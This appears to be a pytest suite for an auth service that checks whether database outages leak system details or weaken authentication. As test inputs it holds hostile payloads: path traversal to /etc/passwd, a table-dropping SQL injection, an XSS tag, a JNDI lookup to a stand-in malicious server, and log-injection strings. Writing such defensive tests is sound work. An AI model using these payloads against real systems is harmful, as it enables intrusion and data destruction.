"""FAILING TESTS: Security Scan Handling with Broken Database - Critical Issue from Iteration 3

CRITICAL SECURITY EXPOSURE ISSUE TO REPLICATE:
- Security scan attempts when database is unavailable may expose internal errors
- Error messages might leak system information to potential attackers
- Broken database state could bypass security validations
- Service continues responding to requests despite being in compromised state

Business Value Justification (BVJ):
- Segment: Platform/Internal
- Business Goal: Security and information disclosure prevention
- Value Impact: Prevents exposure of internal system details to attackers
- Strategic Impact: Maintains security posture even during service degradation

These tests are designed to FAIL with the current system state and PASS once security
scan handling is properly implemented for degraded database states.
"""

import os
import sys
import pytest
import asyncio
import logging
from unittest.mock import patch, MagicMock, AsyncMock
from sqlalchemy.exc import OperationalError, DatabaseError

from auth_service.auth_core.config import AuthConfig
from auth_service.auth_core.database.connection import AuthDatabase, auth_db
from test_framework.environment_markers import env, staging_only, env_requires

logger = logging.getLogger(__name__)


class TestSecurityScanHandlingWithBrokenDatabase:
    """Test suite for security scan handling when database connectivity is broken."""
    
    @pytest.mark.asyncio
    async def test_security_scans_expose_database_error_details(self):
        """FAILING TEST: Security scans might expose detailed database error information.
        
        When database is broken (netra_dev doesn't exist), security scan attempts
        should not receive detailed error information that could be useful to attackers.
        """
        with patch.dict(os.environ, {
            'ENVIRONMENT': 'development',
            'POSTGRES_DB': 'netra_dev',  # Broken database
            'POSTGRES_HOST': 'localhost',
            'POSTGRES_USER': 'postgres',
            'POSTGRES_PASSWORD': 'test_password'
        }):
            # Common security scan request patterns
            security_scan_requests = [
                {
                    'path': '/admin',
                    'headers': {'User-Agent': 'security-scanner'},
                    'expected_response': 'generic_error'
                },
                {
                    'path': '/health?debug=true',
                    'headers': {'User-Agent': 'sqlmap/1.0'},
                    'expected_response': 'generic_error'
                },
                {
                    'path': '/auth/../../../etc/passwd',
                    'headers': {'User-Agent': 'nmap'},
                    'expected_response': 'generic_error'
                },
                {
                    'path': '/health',
                    'headers': {'User-Agent': 'python-requests/2.28.1', 'X-Scanner': 'vulnerability-test'},
                    'expected_response': 'basic_health_info'
                },
                {
                    'path': '/readiness',
                    'headers': {'User-Agent': 'curl/7.68.0', 'X-Forwarded-For': 'scanner-ip'},
                    'expected_response': 'readiness_info'
                }
            ]
            
            test_auth_db = AuthDatabase()
            
            # Mock database being unavailable
            async def mock_db_unavailable(*args, **kwargs):
                raise OperationalError(
                    'connection to server at "localhost:5432" failed: '
                    'FATAL: database "netra_dev" does not exist\n'
                    'Detail: The database "netra_dev" was not found on the server.\n'
                    'Hint: Check if the database name is correct.',
                    None, None
                )
            
            with patch.object(test_auth_db, 'test_connection', side_effect=mock_db_unavailable):
                for scan_request in security_scan_requests:
                    try:
                        # Simulate request processing with broken database
                        response = await self._simulate_request_processing(scan_request, test_auth_db)
                        
                        # Check for information disclosure in response
                        security_issues = self._check_response_for_security_issues(response, scan_request)
                        
                        if security_issues:
                            pytest.fail(
                                f"Security scan to '{scan_request['path']}' exposed sensitive information: {security_issues}. "
                                "Broken database state should not leak system details to potential attackers."
                            )
                            
                    except Exception as e:
                        # Unhandled exceptions during security scans are also a problem
                        if self._is_security_sensitive_error(str(e)):
                            pytest.fail(
                                f"Security scan to '{scan_request['path']}' caused sensitive error: {e}. "
                                "Error handling should prevent information disclosure."
                            )
    
    async def _simulate_request_processing(self, scan_request, auth_db):
        """Simulate how the FastAPI app would process security scan requests."""
        path = scan_request['path']
        headers = scan_request['headers']
        
        # Simulate different endpoint processing
        if path == '/health':
            from auth_service.main import health_interface
            try:
                return {
                    'status_code': 200,
                    'body': health_interface.get_basic_health(),
                    'headers': {'X-Service-Name': 'auth-service'}
                }
            except Exception as e:
                return {
                    'status_code': 500,
                    'body': {'error': str(e)},
                    'headers': {'X-Service-Name': 'auth-service'}
                }
        
        elif path == '/readiness' or path == '/health/ready':
            try:
                is_ready = await auth_db.is_ready() if hasattr(auth_db, 'is_ready') else True
                if is_ready:
                    return {
                        'status_code': 200,
                        'body': {'ready': True, 'service': 'auth-service'}
                    }
                else:
                    return {
                        'status_code': 503,
                        'body': {'ready': False, 'service': 'auth-service', 'reason': 'Database not ready'}
                    }
            except Exception as e:
                # This is the problematic path - might expose database details
                return {
                    'status_code': 503,
                    'body': {'ready': False, 'service': 'auth-service', 'reason': str(e)}
                }
        
        elif path.startswith('/admin') or '/..' in path:
            # Security scan paths - should return generic errors
            return {
                'status_code': 404,
                'body': {'error': 'Not found'},
                'headers': {'X-Service-Name': 'auth-service'}
            }
        
        else:
            # Other paths that might trigger database operations
            try:
                # This might fail with database errors
                await auth_db.test_connection()
                return {
                    'status_code': 200,
                    'body': {'message': 'OK'}
                }
            except Exception as e:
                return {
                    'status_code': 500,
                    'body': {'error': str(e)}  # Potential information disclosure
                }
    
    def _check_response_for_security_issues(self, response, scan_request):
        """Check response for potential security information disclosure."""
        security_issues = []
        
        response_body = response.get('body', {})
        response_text = str(response_body)
        
        # Check for database-specific information disclosure
        database_disclosure_patterns = [
            'database "netra_dev" does not exist',
            'FATAL:',
            'connection to server at',
            'localhost:5432',
            'postgres',
            'OperationalError',
            'sqlalchemy',
            'asyncpg',
            'Connection refused',
            'Detail:',
            'Hint:'
        ]
        
        for pattern in database_disclosure_patterns:
            if pattern in response_text:
                security_issues.append(f"Database information disclosed: '{pattern}'")
        
        # Check for system path disclosure
        system_path_patterns = [
            '/auth_service/',
            '__file__',
            'traceback',
            'python',
            '.py',
            'auth_core'
        ]
        
        for pattern in system_path_patterns:
            if pattern in response_text:
                security_issues.append(f"System path disclosed: '{pattern}'")
        
        # Check for configuration disclosure
        config_disclosure_patterns = [
            'POSTGRES_PASSWORD',
            'POSTGRES_HOST', 
            'DATABASE_URL',
            'development',
            'staging'
        ]
        
        for pattern in config_disclosure_patterns:
            if pattern in response_text:
                security_issues.append(f"Configuration disclosed: '{pattern}'")
        
        return security_issues
    
    def _is_security_sensitive_error(self, error_message):
        """Check if error message contains security-sensitive information."""
        sensitive_patterns = [
            'database "netra_dev" does not exist',
            'connection refused',
            'authentication failed',
            'password',
            'postgresql://',
            'localhost:5432'
        ]
        
        return any(pattern in error_message.lower() for pattern in sensitive_patterns)
    
    @pytest.mark.asyncio
    async def test_automated_vulnerability_scanners_get_system_info(self):
        """FAILING TEST: Automated vulnerability scanners can extract system information.
        
        Common vulnerability scanners should not be able to extract detailed
        system information from error responses when database is broken.
        """
        with patch.dict(os.environ, {
            'ENVIRONMENT': 'development',
            'POSTGRES_DB': 'netra_dev'
        }):
            # Common vulnerability scanner user agents
            vulnerability_scanners = [
                {
                    'name': 'SQLMap',
                    'user_agent': 'sqlmap/1.6.2#stable (http://sqlmap.org)',
                    'scan_paths': ['/health?id=1', '/auth?user=admin', '/readiness?debug=1'],
                    'extraction_attempts': ['database_version', 'error_details', 'system_paths']
                },
                {
                    'name': 'Nmap NSE',
                    'user_agent': 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
                    'scan_paths': ['/admin', '/config', '/status'],
                    'extraction_attempts': ['service_version', 'technology_stack', 'database_info']
                },
                {
                    'name': 'Nikto',
                    'user_agent': 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)',
                    'scan_paths': ['/cgi-bin/test', '/.env', '/backup'],
                    'extraction_attempts': ['configuration_files', 'backup_files', 'test_interfaces']
                },
                {
                    'name': 'OWASP ZAP',
                    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 OWASP ZAP/2.11.1',
                    'scan_paths': ['/health', '/readiness', '/docs'],
                    'extraction_attempts': ['api_documentation', 'health_details', 'service_info']
                }
            ]
            
            test_auth_db = AuthDatabase()
            
            # Mock database unavailable
            async def mock_db_error(*args, **kwargs):
                raise OperationalError(
                    'connection to server at "localhost:5432" failed: '
                    'database "netra_dev" does not exist',
                    None, None
                )
            
            with patch.object(test_auth_db, 'test_connection', side_effect=mock_db_error):
                for scanner in vulnerability_scanners:
                    scanner_issues = []
                    
                    for path in scanner['scan_paths']:
                        scan_request = {
                            'path': path,
                            'headers': {'User-Agent': scanner['user_agent']},
                            'scanner': scanner['name']
                        }
                        
                        try:
                            response = await self._simulate_request_processing(scan_request, test_auth_db)
                            
                            # Check what information the scanner could extract
                            extracted_info = self._extract_scanner_information(response, scanner['extraction_attempts'])
                            
                            if extracted_info:
                                scanner_issues.extend(extracted_info)
                                
                        except Exception as e:
                            # Scanner-triggered exceptions might also reveal info
                            error_info = self._extract_error_information(str(e))
                            if error_info:
                                scanner_issues.extend(error_info)
                    
                    if scanner_issues:
                        pytest.fail(
                            f"Vulnerability scanner '{scanner['name']}' extracted sensitive information: {scanner_issues}. "
                            "System should not expose internal details to automated scanners when database is broken."
                        )
    
    def _extract_scanner_information(self, response, extraction_attempts):
        """Simulate what information a vulnerability scanner could extract."""
        extracted = []
        response_text = str(response.get('body', {}))
        headers = response.get('headers', {})
        
        for attempt in extraction_attempts:
            if attempt == 'database_version' and 'postgres' in response_text.lower():
                extracted.append(f"Database type detected: PostgreSQL")
            
            if attempt == 'error_details' and ('error' in response_text.lower() or response.get('status_code', 200) >= 400):
                extracted.append(f"Error details exposed: {response_text[:100]}")
            
            if attempt == 'system_paths' and '/' in response_text:
                extracted.append(f"System paths detected in response")
            
            if attempt == 'service_version' and 'auth-service' in response_text:
                extracted.append(f"Service identification: auth-service")
            
            if attempt == 'technology_stack':
                tech_indicators = ['python', 'fastapi', 'uvicorn', 'sqlalchemy']
                found_tech = [tech for tech in tech_indicators if tech in response_text.lower()]
                if found_tech:
                    extracted.append(f"Technology stack detected: {found_tech}")
        
        return extracted
    
    def _extract_error_information(self, error_message):
        """Extract information that could be useful to attackers from error messages."""
        extracted = []
        error_lower = error_message.lower()
        
        if 'netra_dev' in error_lower:
            extracted.append("Database name disclosed in error")
        
        if 'localhost' in error_lower or '5432' in error_lower:
            extracted.append("Database connection details disclosed")
        
        if 'postgres' in error_lower and 'password' in error_lower:
            extracted.append("Database authentication details disclosed")
        
        return extracted
    
    @pytest.mark.asyncio
    async def test_denial_of_service_through_database_error_amplification(self):
        """FAILING TEST: DoS attacks through database error amplification when DB is broken.
        
        When database is broken, repeated requests might cause resource exhaustion
        through error handling or connection retry attempts.
        """
        with patch.dict(os.environ, {
            'ENVIRONMENT': 'development',
            'POSTGRES_DB': 'netra_dev'
        }):
            test_auth_db = AuthDatabase()
            
            # Mock database operations that fail with resource-intensive errors
            async def mock_resource_intensive_db_error(*args, **kwargs):
                # Simulate an error that might trigger retries or heavy logging
                await asyncio.sleep(0.1)  # Simulate processing time
                raise OperationalError(
                    'connection to server at "localhost:5432" failed: '
                    'database "netra_dev" does not exist\n'
                    'Detail: Connection attempt failed after 30 seconds\n'
                    'Hint: Check server logs for more information.',
                    None, None
                )
            
            with patch.object(test_auth_db, 'test_connection', side_effect=mock_resource_intensive_db_error):
                # Simulate DoS attack pattern
                concurrent_requests = 50
                request_tasks = []
                
                async def make_malicious_request(request_id):
                    try:
                        # Simulate attacker making requests that trigger database operations
                        for endpoint in ['/health', '/readiness', '/auth/validate']:
                            scan_request = {
                                'path': endpoint,
                                'headers': {
                                    'User-Agent': f'DoS-Attack-{request_id}',
                                    'X-Attack-Type': 'database-exhaustion'
                                }
                            }
                            response = await self._simulate_request_processing(scan_request, test_auth_db)
                            
                            # Track response time and resource usage
                            if response.get('status_code', 200) >= 500:
                                return {'request_id': request_id, 'dos_effective': True, 'endpoint': endpoint}
                        
                        return {'request_id': request_id, 'dos_effective': False}
                    
                    except Exception as e:
                        return {'request_id': request_id, 'dos_effective': True, 'error': str(e)}
                
                # Launch concurrent malicious requests
                for i in range(concurrent_requests):
                    task = asyncio.create_task(make_malicious_request(i))
                    request_tasks.append(task)
                
                import time
                start_time = time.time()
                
                try:
                    # Wait for requests with timeout
                    results = await asyncio.wait_for(
                        asyncio.gather(*request_tasks, return_exceptions=True),
                        timeout=10.0
                    )
                    
                    end_time = time.time()
                    total_time = end_time - start_time
                    
                    # Analyze DoS effectiveness
                    effective_dos_count = sum(1 for result in results 
                                            if isinstance(result, dict) and result.get('dos_effective', False))
                    
                    if effective_dos_count > 10:  # Arbitrary threshold
                        pytest.fail(
                            f"DoS attack partially successful: {effective_dos_count}/{concurrent_requests} requests caused resource issues. "
                            f"Total time: {total_time:.2f}s. "
                            "Broken database state should not amplify DoS attack effectiveness."
                        )
                        
                except asyncio.TimeoutError:
                    pytest.fail(
                        "DoS attack caused service timeout - database error handling is vulnerable to resource exhaustion."
                    )
    
    @pytest.mark.asyncio
    async def test_security_bypasses_through_degraded_authentication(self):
        """FAILING TEST: Security bypasses possible when authentication database is broken.
        
        When authentication database is unavailable, security validations might
        be bypassed or weakened, creating security vulnerabilities.
        """
        with patch.dict(os.environ, {
            'ENVIRONMENT': 'development',
            'POSTGRES_DB': 'netra_dev'
        }):
            test_auth_db = AuthDatabase()
            
            # Mock authentication database unavailable
            async def mock_auth_db_unavailable(*args, **kwargs):
                raise OperationalError('database "netra_dev" does not exist', None, None)
            
            with patch.object(test_auth_db, 'get_session') as mock_get_session:
                # Mock session that fails on authentication queries
                mock_session = AsyncMock()
                mock_session.execute = AsyncMock(side_effect=mock_auth_db_unavailable)
                mock_session.commit = AsyncMock(side_effect=mock_auth_db_unavailable)
                mock_session.rollback = AsyncMock()
                mock_session.close = AsyncMock()
                
                mock_get_session.return_value.__aenter__ = AsyncMock(return_value=mock_session)
                mock_get_session.return_value.__aexit__ = AsyncMock()
                
                # Test potential security bypass scenarios
                security_bypass_tests = [
                    {
                        'test_name': 'token_validation_bypass',
                        'description': 'Invalid tokens accepted when database is down',
                        'attack_vector': {'token': 'invalid_or_expired_token'}
                    },
                    {
                        'test_name': 'session_validation_bypass',
                        'description': 'Sessions not properly validated when database is down',
                        'attack_vector': {'session_id': 'fake_session_id'}
                    },
                    {
                        'test_name': 'user_authentication_bypass',
                        'description': 'User authentication bypassed when database is down',
                        'attack_vector': {'user_id': 'unauthorized_user'}
                    },
                    {
                        'test_name': 'permission_check_bypass',
                        'description': 'Permission checks bypassed when database is down',
                        'attack_vector': {'action': 'admin_operation', 'user': 'regular_user'}
                    }
                ]
                
                security_vulnerabilities = []
                
                for bypass_test in security_bypass_tests:
                    try:
                        # Simulate security validation that should fail but might not
                        # when database is unavailable
                        
                        validation_result = await self._simulate_security_validation(
                            bypass_test['test_name'], 
                            bypass_test['attack_vector'],
                            test_auth_db
                        )
                        
                        # If validation passes when database is broken, that's a security issue
                        if validation_result.get('validation_passed', False):
                            security_vulnerabilities.append({
                                'test': bypass_test['test_name'],
                                'description': bypass_test['description'],
                                'vulnerability': f"Security validation passed despite database being unavailable: {validation_result}"
                            })
                    
                    except OperationalError:
                        # Expected behavior - security validations should fail when database is down
                        pass
                    
                    except Exception as e:
                        # Unexpected errors might indicate security issues
                        security_vulnerabilities.append({
                            'test': bypass_test['test_name'],
                            'description': bypass_test['description'],
                            'vulnerability': f"Unexpected error during security validation: {e}"
                        })
                
                if security_vulnerabilities:
                    pytest.fail(
                        f"Security bypasses detected when database is broken: {security_vulnerabilities}. "
                        "Security validations should fail securely when database is unavailable."
                    )
    
    async def _simulate_security_validation(self, validation_type, attack_vector, auth_db):
        """Simulate security validation operations that depend on database."""
        
        if validation_type == 'token_validation_bypass':
            # Simulate token validation
            try:
                async with auth_db.get_session() as session:
                    # This should fail when database is unavailable
                    from sqlalchemy import text
                    result = await session.execute(
                        text("SELECT user_id FROM auth_sessions WHERE refresh_token_hash = :token"),
                        {'token': attack_vector['token']}
                    )
                    user_id = result.scalar_one_or_none()
                    return {'validation_passed': user_id is not None, 'user_id': user_id}
            except Exception:
                # Token validation should fail securely
                return {'validation_passed': False, 'reason': 'database_unavailable'}
        
        elif validation_type == 'session_validation_bypass':
            try:
                async with auth_db.get_session() as session:
                    from sqlalchemy import text
                    result = await session.execute(
                        text("SELECT expires_at FROM auth_sessions WHERE id = :session_id"),
                        {'session_id': attack_vector['session_id']}
                    )
                    expires_at = result.scalar_one_or_none()
                    return {'validation_passed': expires_at is not None, 'expires_at': expires_at}
            except Exception:
                return {'validation_passed': False, 'reason': 'database_unavailable'}
        
        elif validation_type == 'user_authentication_bypass':
            try:
                async with auth_db.get_session() as session:
                    from sqlalchemy import text
                    result = await session.execute(
                        text("SELECT id FROM auth_users WHERE id = :user_id"),
                        {'user_id': attack_vector['user_id']}
                    )
                    user_exists = result.scalar_one_or_none()
                    return {'validation_passed': user_exists is not None, 'user_exists': user_exists}
            except Exception:
                return {'validation_passed': False, 'reason': 'database_unavailable'}
        
        elif validation_type == 'permission_check_bypass':
            # Simulate permission check that might be bypassed
            try:
                # This might have fallback logic that's insecure
                return {'validation_passed': True, 'reason': 'fallback_permission_granted'}
            except Exception:
                return {'validation_passed': False, 'reason': 'permission_check_failed'}
        
        return {'validation_passed': False, 'reason': 'unknown_validation_type'}
    
    @pytest.mark.asyncio
    async def test_log_injection_through_database_error_messages(self):
        """FAILING TEST: Log injection attacks possible through database error messages.
        
        Malicious input in requests might be reflected in database error messages
        and then logged, potentially causing log injection vulnerabilities.
        """
        with patch.dict(os.environ, {
            'ENVIRONMENT': 'development',
            'POSTGRES_DB': 'netra_dev'
        }):
            test_auth_db = AuthDatabase()
            
            # Mock database errors that might include user input
            log_injection_payloads = [
                '\n[CRITICAL] SYSTEM COMPROMISED - ADMIN ACCESS GRANTED\n',
                '\r\n[ERROR] Fake security alert\r\n',
                '\x00\x01\x02BINARY_INJECTION\x03\x04',
                '"; DROP TABLE auth_users; --',
                '<script>alert("XSS in logs")</script>',
                '${jndi:ldap://malicious-server/exploit}'
            ]
            
            for payload in log_injection_payloads:
                async def mock_db_error_with_payload(*args, **kwargs):
                    # Database error that might include the malicious payload
                    raise OperationalError(
                        f'connection failed for user "{payload}": database "netra_dev" does not exist',
                        None, None
                    )
                
                with patch.object(test_auth_db, 'test_connection', side_effect=mock_db_error_with_payload):
                    try:
                        # Simulate request that triggers database operation with malicious input
                        malicious_request = {
                            'path': '/auth/login',
                            'headers': {'User-Agent': f'LogInjection{payload}'},
                            'data': {'username': payload, 'password': 'test'}
                        }
                        
                        response = await self._simulate_request_processing(malicious_request, test_auth_db)
                        
                        # Check if payload might end up in logs or responses
                        response_text = str(response.get('body', {}))
                        
                        if payload in response_text:
                            pytest.fail(
                                f"Log injection payload reflected in response: {payload[:50]}. "
                                "Database error messages should be sanitized before logging or returning to users."
                            )
                    
                    except Exception as e:
                        error_message = str(e)
                        
                        # Check if payload is in error message (would be logged)
                        if payload in error_message:
                            pytest.fail(
                                f"Log injection payload included in error message: {payload[:50]}. "
                                "Error messages should be sanitized to prevent log injection attacks."
                            )


# Mark all tests as integration tests requiring database setup
pytestmark = [pytest.mark.integration, pytest.mark.database]